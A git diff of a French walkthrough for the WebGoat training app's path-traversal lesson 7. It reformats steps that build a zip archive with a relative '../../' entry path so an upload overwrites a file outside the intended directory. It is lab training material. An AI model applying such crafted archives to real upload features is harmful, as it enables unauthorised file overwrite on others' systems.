@@ -618,14 +618,21 @@ Pour les premières leçons de l’application WebGoat, vous aurez besoin d’ut
      <details>
     <summary> Path traversal - 7 </summary>
         
-   Pour cette dernière partie le chemin de l’image qui est contenu dans le fichier zip doit contenir le path traversal. Ici il faudra recréer le chemin que nous voulons écraser : mkdir -p challenge7/home/webgoat/.webgoat-2023.8/PathTraversal/julien/ copier une image dans le dernier répertoire
-        
+   Pour cette dernière partie le chemin de l’image qui est contenu dans le fichier zip doit contenir le path traversal. Ici il faudra recréer le chemin que nous voulons écraser :
+   ```bash
+   mkdir -p challenge7/home/webgoat/.webgoat-2023.8/PathTraversal/julien/ 
+   ```
+   copier une image dans le dernier répertoire     
    ```bash
         ls challenge7/home/webgoat/.webgoat-2023.8/PathTraversal/julien/
         image.jpg
+   ```
         puis rentrer dans deux niveaux de répertoires :
+   ```bash
         cd challenge7/home
+   ```
         enfin compresser l’image avec un chemin relatif :
+   ```bash
         zip file.zip ../../home/webgoat/.webgoat-2023.8/PathTraversal/julien/image.jpg
    ```
         
